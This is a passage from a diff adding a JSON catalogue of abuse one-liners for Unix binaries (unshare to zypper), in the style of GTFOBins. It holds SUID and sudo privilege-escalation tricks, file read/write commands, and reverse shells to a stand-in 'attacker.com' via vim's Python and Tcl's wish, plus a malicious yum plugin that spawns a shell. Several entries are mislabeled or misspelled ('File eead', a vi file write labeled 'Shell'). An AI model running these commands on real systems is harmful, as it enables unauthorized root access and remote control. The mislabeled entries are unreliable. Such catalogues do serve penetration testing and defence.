+    "Shell": "sudo sh -c 'cp $(which unshare) .; chmod +s ./unshare'\n\n./unshare -r /bin/sh"
+  },
+  "uudecode": {
+    "File read": "sudo sh -c 'cp $(which uudecode) .; chmod +s ./uudecode'\n\nLFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode"
+  },
+  "uuencode": {
+    "File read": "sudo sh -c 'cp $(which uuencode) .; chmod +s ./uuencode'\n\nLFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode"
+  },
+  "valgrind": {
+    "Shell": "sudo valgrind /bin/sh"
+  },
+  "vi": {
+    "Shell": "vi file_to_write\niDATA\n^[\nw"
+  },
+  "vim": {
+    "Shell": "export RHOST=attacker.com\nexport RPORT=12345\nvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'"
+  },
+  "watch": {
+    "Shell": "sudo sh -c 'cp $(which watch) .; chmod +s ./watch'\n\n./watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
+  },
+  "wget": {
+    "File upload": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nwget $URL -O $LFILE"
+  },
+  "whois": {
+    "File upload": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT > \"$LFILE\"",
+    "File download": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT | base64 -d > \"$LFILE\""
+  },
+  "wish": {
+    "Shell": "export RHOST=attacker.com\nexport RPORT=12345\necho 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish"
+  },
+  "xargs": {
+    "Shell": "LFILE=file_to_read\nxargs -a \"$LFILE\" -0"
+  },
+  "xxd": {
+    "File write": "LFILE=file_to_read\nxxd \"$LFILE\" | xxd -r"
+  },
+  "xz": {
+    "File read": "sudo sh -c 'cp $(which xz) .; chmod +s ./xz'\n\nLFILE=file_to_read\n./xz -c \"$LFILE\" | xz -d"
+  },
+  "yelp": {
+   "File eead":"LFILE=file_to_read\nyelp \"man:$LFILE\""
+  },
+  "yum": {
+   "Sudo":"TF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\nsudo yum localinstall -y x-1.0-1.noarch.rpm\n\nTF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y"
+  },
+  "zip": {
+    "Shell": "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF"
+  },
+  "zsh": {
+    "Shell": "sudo sh -c 'cp $(which zsh) .; chmod +s ./zsh'\n\n./zsh"
+  },
+  "zsoelim": {
+    "File read": "sudo sh -c 'cp $(which zsoelim) .; chmod +s ./zsoelim'\n\nLFILE=file_to_read\n./zsoelim \"$LFILE\""
+  },
+  "zypper": {
+    "Shell": "sudo zypper x",
+    "Sudo": "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x"
+  }
+}
